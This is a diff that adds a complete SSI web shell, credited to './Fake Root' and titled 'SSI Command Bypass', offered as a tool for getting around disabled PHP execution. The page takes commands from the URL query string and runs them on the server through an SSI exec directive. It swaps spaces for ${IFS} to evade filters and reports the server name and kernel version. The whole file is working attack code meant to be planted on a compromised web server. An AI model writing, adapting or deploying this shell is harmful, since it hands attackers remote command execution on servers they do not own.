@@ -1,0 +1,56 @@
+<!-- Author : ./Fake Root -->
+<!-- hargai author dengan cara menggunakan script ini tanpa mengrecode script ini !!! -->
+
+<!--#config errmsg="[Error in shell]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="whoami" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
+<head>
+<title>SSI Command Bypass</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script language="javascript">
+function fex()
+{
+	var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+}
+</script>
+<script>
+document.onkeydown = keydown;
+function keydown(e) {
+    if (!e) e = event;
+    if (e.keyCode === 13) {
+    	var uri = document.getElementById('command').value;
+    	var rep = uri.replace(/[ ]/g,'${IFS}');
+		var res = encodeURI(uri);
+        document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+
+    }
+}
+</script>
+
+</head>
+<body>
+<font face=courier size=2><i>php engine disable bypass by ./Fake Root | server : <font color=green><!--#exec cmd="{uname,-nr}" --></font><br>
+<font size=2>Command : <input type=text size=60 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;">&nbsp;<input type=button value=Execute onclick="fex();">
+<hr>
+Executed Command : </font><b><!--#echo var=shl --></b><br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15>
+<!--#exec cmd=$shl -->
+</textarea>
+<script>
+//$('body').on('input', 'input[name=address1]', function() {
+//  $(this).val($(this).val().replace(' ', '${IFS}'));
+//});
+</script>
+<hr>
+<center>
+	<font face="courier" size=2>./Fake Root<br><a href="https://fake-root.blogspot.com/?m=1" target="_blank">https://fake-root.blogspot.com/</a></font></center>
+</body>
+</html>
